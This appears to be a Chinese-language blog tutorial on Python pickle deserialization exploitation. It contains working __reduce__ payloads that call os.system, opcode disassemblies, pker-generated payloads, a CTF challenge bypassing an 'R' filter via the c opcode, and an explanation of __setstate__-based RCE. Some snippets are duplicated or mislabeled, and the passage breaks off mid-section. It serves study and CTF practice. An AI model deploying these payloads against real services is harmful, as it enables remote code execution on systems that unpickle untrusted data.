<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.load</span><br><span class="line">pickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">cPickle.loads</span><br><span class="line">cPickle.load</span><br><span class="line">cPickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">shelve.<span class="built_in">open</span></span><br><span class="line">marshal.load</span><br><span class="line">marshal.loads</span><br></pre></td></tr></tbody></table></figure>
<h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>1.序列化数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>2.反序列化数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></tbody></table></figure>
<pre><code>pickle.Unpickler像一个代理类一样，在序列化前进行处理，进行安全过滤之类的。
</code></pre>
<p>Python2标准库中有pickle和cPickle，Python3中只有前者。</p>
<p>pickle由于有不同的实现版本，目前有6个版本，但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），目前pickle只有6个版本。</p>
<p>如果python2中的序列化文件如果想在python3中读取，需要修改编码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选定pickle版本</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">a={<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">2</span>}</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f'# 原变量：<span class="subst">{a!r}</span>'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'pickle版本<span class="subst">{i}</span>'</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"><span class="comment"># python2读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'data.pkl'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    l = <span class="built_in">list</span>(pickle.load(f))</span><br><span class="line"><span class="comment"># python3读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'data.pkl'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    u = pickle._Unpickler(f)</span><br><span class="line">    u.encoding = <span class="string">'latin1'</span></span><br><span class="line">    p = u.load()</span><br></pre></td></tr></tbody></table></figure>
<p>pickle允许任意对象通过定义__reduce__方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__reduce__</span><br><span class="line">被定义之后，当对象被Pickle时就会被调用</span><br><span class="line">要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含<span class="number">2</span>到<span class="number">5</span>个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用</span><br><span class="line">__reduce_ex__</span><br><span class="line">首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</span><br></pre></td></tr></tbody></table></figure>
<p>编写漏洞代码__reduce__</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'whoami'</span>,))</span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></tbody></table></figure>
<p>如果使用的是__reduce_ex__</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cmd = cmd</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce_ex__</span>(<span class="params">self,cmd</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="variable language_">self</span>.cmd,))</span><br><span class="line">a=test(<span class="string">'whoami'</span>)</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></tbody></table></figure>
<p>其中pickle.loads是会解决import问题，对于未引入的module会自动尝试import。</p>
<p>比如说我们直接执行代码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle;pickle.loads(<span class="string">b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>内置能够执行命令的函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>,execfile,<span class="built_in">compile</span>,<span class="built_in">open</span>,file,<span class="built_in">map</span>,<span class="built_in">input</span>,os.system,os.popen,os.popen2,os.popen3,os.popen4,os.<span class="built_in">open</span>,os.pipe,os.listdir,os.access,os.execl,os.execle,os.execlp,os.execlpe,os.execv,os.execve,os.execvp,os.execvpe,os.spawnl,os.spawnle,os.spawnlp,os.spawnlpe,os.spawnv,os.spawnve,os.spawnvp,os.spawnvpe,pickle.load,pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.<span class="built_in">open</span>,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.<span class="built_in">open</span>,posixfile.fileopen,platform.popen</span><br></pre></td></tr></tbody></table></figure>
<h4 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h4><p>不同的操作码对应不同的动作，接下来开始学习PVM是如何运作opcode的。我们需要知道的是：PVM引擎会识别opcode中不同的指令码，从而进行相应的操作。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">data=<span class="string">b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></tbody></table></figure>
<table>
<thead>
<tr>
<th align="left">name</th>
<th align="left">op</th>
<th align="left">params</th>
<th align="left">describe</th>
<th align="left">e.g.</th>
</tr>
</thead>
<tbody><tr>
<td align="left">MARK</td>
<td align="left">(</td>
<td align="left">null</td>
<td align="left">向栈顶push一个MARK</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">STOP</td>
<td align="left">.</td>
<td align="left">null</td>
<td align="left">结束</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">POP</td>
<td align="left">0</td>
<td align="left">null</td>
<td align="left">丢弃栈顶第一个元素</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">POP_MARK</td>
<td align="left">1</td>
<td align="left">null</td>
<td align="left">丢弃栈顶到MARK之上的第一个元素</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">DUP</td>
<td align="left">2</td>
<td align="left">null</td>
<td align="left"></td>
<td align="left">在栈顶赋值一次栈顶元素</td>
</tr>
<tr>
<td align="left">FLOAT</td>
<td align="left">F</td>
<td align="left">F [float]</td>
<td align="left">push一个float</td>
<td align="left">F1.0</td>
</tr>
<tr>
<td align="left">INT</td>
<td align="left">I</td>
<td align="left">I [int]</td>
<td align="left">push一个integer</td>
<td align="left">I1</td>
</tr>
<tr>
<td align="left">NONE</td>
<td align="left">N</td>
<td align="left">null</td>
<td align="left">push一个None</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">REDUCE</td>
<td align="left">R</td>
<td align="left">[callable] [tuple] R</td>
<td align="left">调用一个callable对象</td>
<td align="left">crandom\nRandom\n)R</td>
</tr>
<tr>
<td align="left">STRING</td>
<td align="left">S</td>
<td align="left">S [string]</td>
<td align="left">push一个string</td>
<td align="left">S ‘x’</td>
</tr>
<tr>
<td align="left">UNICODE</td>
<td align="left">V</td>
<td align="left">V [unicode]</td>
<td align="left">push一个unicode string</td>
<td align="left">V ‘x’</td>
</tr>
<tr>
<td align="left">APPEND</td>
<td align="left">a</td>
<td align="left">[list] [obj] a</td>
<td align="left">向列表append单个对象 	]I100\na</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">BUILD</td>
<td align="left">b</td>
<td align="left">[obj] [dict] b</td>
<td align="left">添加实例属性（修改__dict__）</td>
<td align="left">cmodule\nCls\n)R(I1\nI2\ndb</td>
</tr>
<tr>
<td align="left">GLOBAL</td>
<td align="left">c</td>
<td align="left">c [module] [name]</td>
<td align="left">调用Pickler的find_class，导入module.name并push到栈顶</td>
<td align="left">cos\nsystem\n</td>
</tr>
<tr>
<td align="left">DICT</td>
<td align="left">d</td>
<td align="left">MARK [[k] [v]…] d</td>
<td align="left">将栈顶MARK以前的元素弹出构造dict，再push回栈顶</td>
<td align="left">(I0\nI1\nd</td>
</tr>
<tr>
<td align="left">EMPTY_DICT 	} 	null 	push一个空dict</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">APPENDS</td>
<td align="left">e</td>
<td align="left">[list] MARK [obj…] e</td>
<td align="left">将栈顶MARK以前的元素append到前一个的list 	](I0\ne</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">GET</td>
<td align="left">g</td>
<td align="left">g [index]</td>
<td align="left">从memo获取元素</td>
<td align="left">g0</td>
</tr>
<tr>
<td align="left">INST</td>
<td align="left">i</td>
<td align="left">MARK [args…] i [module] [cls]</td>
<td align="left">构造一个类实例（其实等同于调用一个callable对象），内部调用了find_class</td>
<td align="left">(S’ls’\nios\nsystem\n</td>
</tr>
<tr>
<td align="left">LIST</td>
<td align="left">l</td>
<td align="left">MARK [obj] l</td>
<td align="left">将栈顶MARK以前的元素弹出构造一个list，再push回栈顶</td>
<td align="left">(I0\nl</td>
</tr>
<tr>
<td align="left">EMPTY_LIST</td>
<td align="left">]</td>
<td align="left">null</td>
<td align="left">push一个空list</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">OBJ</td>
<td align="left">o</td>
<td align="left">MARK [callable] [args…] o</td>
<td align="left">同INST，参数获取方式由readline变为stack.pop而已</td>
<td align="left">(cos\nsystem\nS’ls’\no</td>
</tr>
<tr>
<td align="left">PUT</td>
<td align="left">p</td>
<td align="left">p [index]</td>
<td align="left">将栈顶元素放入memo</td>
<td align="left">p0</td>
</tr>
<tr>
<td align="left">SETITEM</td>
<td align="left">s</td>
<td align="left">[dict] [k] [v] s</td>
<td align="left">设置dict的键值 	}I0\nI1\ns</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">TUPLE</td>
<td align="left">t</td>
<td align="left">MARK [obj…] t</td>
<td align="left">将栈顶MARK以前的元素弹出构造tuple，再push回栈顶</td>
<td align="left">(I0\nI1\nt</td>
</tr>
<tr>
<td align="left">EMPTY_TUPLE</td>
<td align="left">)</td>
<td align="left">null</td>
<td align="left">push一个空tuple</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">SETITEMS</td>
<td align="left">u</td>
<td align="left">[dict] MARK [[k] [v]…] u</td>
<td align="left">将栈顶MARK以前的元素弹出update到前一个dict 	}(I0\nI1\nu</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><img src="" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/5.32hr8ytykz.gif" alt="Alt pic"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">三种常见的操作符R（可以执行命令）、i（可以执行命令）、o（可以执行命令），还有一些不常见的c（可以进行变量覆盖）、b（可以执行命令）等，三种常见的如下</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GLOBAL('os', 'system')             =&gt;  cos\nsystem\n</span><br><span class="line">INST('os', 'system', 'ls')         =&gt;  (S'ls'\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL('os', 'system'), 'ls')  =&gt;  (cos\nsystem\nS'ls'\no</span><br></pre></td></tr></tbody></table></figure>
<p>R操作符</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>,))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil(),protocol=<span class="number">0</span>))  <span class="comment"># protocol表示协议版本</span></span><br><span class="line">pickletools.dis(pickle.dumps(Evil(),protocol=<span class="number">0</span>))</span><br></pre></td></tr></tbody></table></figure>
<p>输入的内容如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'cos\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">'os system'</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">'whoami'</span></span><br><span class="line">   <span class="number">23</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">26</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">27</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">30</span>: R    REDUCE</span><br><span class="line">   <span class="number">31</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">34</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以看见opcode第一行导入的是一个os system，这是Linux上的。如果想要在Windows上面使用的话，就得导入nt system模块。如果要避免这种限制需要使用通过AST来构造opcode。<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9naXRodWIuY29tL2VkZGllaXZhbjAxL3BrZXI=">下载</a></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text.txt</span></span><br><span class="line"><span class="comment"># 重载了__import__ os，不然如果使用安全函数是无法自动导入包的</span></span><br><span class="line">os = GLOBAL(<span class="string">'__builtin__'</span>, <span class="string">'__import__'</span>)(<span class="string">'os'</span>)</span><br><span class="line">system = GLOBAL(<span class="string">'__builtin__'</span>, <span class="string">'getattr'</span>)(os, <span class="string">'system'</span>)</span><br><span class="line">system(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></tbody></table></figure>
<p>输入命令python3 pker.py &lt; text.txt即可生成</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"c__builtin__\n__import__\n(S'os'\ntRp0\n0c__builtin__\ngetattr\n(g0\nS'system'\ntRp1\n0g1\n(S'whoami'\ntR."</span></span><br></pre></td></tr></tbody></table></figure>
<p>利用pickletools.dis()转换一下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">'__builtin__ __import__'</span></span><br><span class="line">   <span class="number">24</span>: (    MARK</span><br><span class="line">   <span class="number">25</span>: S        STRING     <span class="string">'os'</span></span><br><span class="line">   <span class="number">31</span>: t        TUPLE      (MARK at <span class="number">24</span>)</span><br><span class="line">   <span class="number">32</span>: R    REDUCE</span><br><span class="line">   <span class="number">33</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">36</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">37</span>: c    GLOBAL     <span class="string">'__builtin__ getattr'</span></span><br><span class="line">   <span class="number">58</span>: (    MARK</span><br><span class="line">   <span class="number">59</span>: g        GET        <span class="number">0</span></span><br><span class="line">   <span class="number">62</span>: S        STRING     <span class="string">'system'</span></span><br><span class="line">   <span class="number">72</span>: t        TUPLE      (MARK at <span class="number">58</span>)</span><br><span class="line">   <span class="number">73</span>: R    REDUCE</span><br><span class="line">   <span class="number">74</span>: p    PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">77</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">78</span>: g    GET        <span class="number">1</span></span><br><span class="line">   <span class="number">81</span>: (    MARK</span><br><span class="line">   <span class="number">82</span>: S        STRING     <span class="string">'whoami'</span></span><br><span class="line">   <span class="number">92</span>: t        TUPLE      (MARK at <span class="number">81</span>)</span><br><span class="line">   <span class="number">93</span>: R    REDUCE</span><br><span class="line">   <span class="number">94</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>上面内容简化下就和上面第一个结构体一样</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'whoami'</span></span><br><span class="line">tR.</span><br></pre></td></tr></tbody></table></figure>
<p>pker语句就是</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未使用安全重载语句的代码会自动import os这个包，所以不需要__builtin__.__import__ 去导入</span></span><br><span class="line">system = GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>)</span><br><span class="line">system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>i操作符<br>pker语句</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">'os'</span>, <span class="string">'system'</span>, <span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>结构体</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S<span class="string">'whoami'</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br></pre></td></tr></tbody></table></figure>
<p>o操作符</p>
<p>pker语句</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INST(<span class="string">'os'</span>, <span class="string">'system'</span>, <span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>结构体</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(S<span class="string">'whoami'</span></span><br><span class="line">ios</span><br><span class="line">system</span><br></pre></td></tr></tbody></table></figure>
<p>o操作符</p>
<p>pker语句</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OBJ(GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>), <span class="string">'whoami'</span>) </span><br></pre></td></tr></tbody></table></figure>
<p>结构体</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">'whoami'</span></span><br><span class="line">o.</span><br></pre></td></tr></tbody></table></figure>
<p>上面这三种都是直接去调用os模块，没有用__builtin__.<strong>import</strong> 去导入，这是因为上面已经提到了pickle.loads会解决import问题，整个python标准库的模块函数均可以使用。<br>c操作符</p>
<p>其实c操作符是基于find_class(moudle, name)来实现的，find_class()函数实现的功能简单来说就是：去moudle模块中找到name，然后对内存原始的数据进行覆盖。但是需要注意的是，moudle必须在name的顶层。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name = <span class="string">'jnzm4x8vgb'</span></span><br><span class="line">flag = <span class="string">'flag{cnqbio0yxa9htwkev61ps}'</span></span><br><span class="line">sign = <span class="string">'gy3z9urcn2as7f05ot8b'</span></span><br><span class="line"><span class="comment"># c_flag.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pickle_test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,sign</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> pickle_test <span class="keyword">and</span> <span class="variable language_">self</span>.name == other.name <span class="keyword">and</span> <span class="variable language_">self</span>.sign == other.sign</span><br><span class="line"></span><br><span class="line">ser = base64.b64decode(<span class="built_in">input</span>(<span class="string">"input:"</span>))</span><br><span class="line"><span class="built_in">print</span>(ser)</span><br><span class="line"><span class="comment"># 过滤R操作符，防止危险函数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> ser:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = pickle.loads(ser)</span><br><span class="line">    correct = ((result == pickle_test(secret.name, secret.sign)))</span><br><span class="line">    <span class="keyword">if</span> correct:</span><br><span class="line">        <span class="built_in">print</span>(secret.flag)</span><br></pre></td></tr></tbody></table></figure>
<p>直接使用pkel进行生成</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin = GLOBAL(<span class="string">'__main__'</span>, <span class="string">'secret'</span>)</span><br><span class="line">admin.name = <span class="string">"test_name"</span></span><br><span class="line">admin.sign = <span class="string">"123456"</span></span><br><span class="line">pickle_test = INST(<span class="string">'__main__'</span>, <span class="string">'pickle_test'</span>,<span class="string">'test_name'</span>,<span class="string">'123456'</span>)</span><br><span class="line"><span class="keyword">return</span> pickle_test</span><br></pre></td></tr></tbody></table></figure>
<p>然后把结果进行base64下，必须使用python的来编码，因为数据类型是字节类型，网页上的是字符型编码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">code=<span class="string">b"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'test_name'\ndtbg0\n(}(S'sign'\nS'123456'\ndtb(S'test_name'\nS'123456'\ni__main__\npickle_test\np3\n0g3\n."</span></span><br><span class="line"><span class="comment">#print(pickletools.dis(code))</span></span><br><span class="line">a=base64.b64encode(code)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/6.6m3oyrwod0.jpg" alt="Alt pic"><br>b操作符</p>
<p>对已有的一个类使用__setstate__()方法进行覆盖</p>
<pre><code>当解封时，如果类定义了 __setstate__()，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 dict。
</code></pre>
<p>如果一个类（暂且称之为Test），它原先是没有定义__setstate__方法的，如果我们现在使用{“<strong>setstate</strong>“: os.system}这个字典来初始化test类的对象（b操作符），现在这个对象便具有了__setstate__方法，之后我们再把待执行的命令作为参数（以whoami为例），再次使用b操作符来执行BUILD指令，由于此时对象存在__setstate__方法，所以便会执行os.system(‘whoami’)，成功实现了RCE。</p>
<p>构建代码</p>
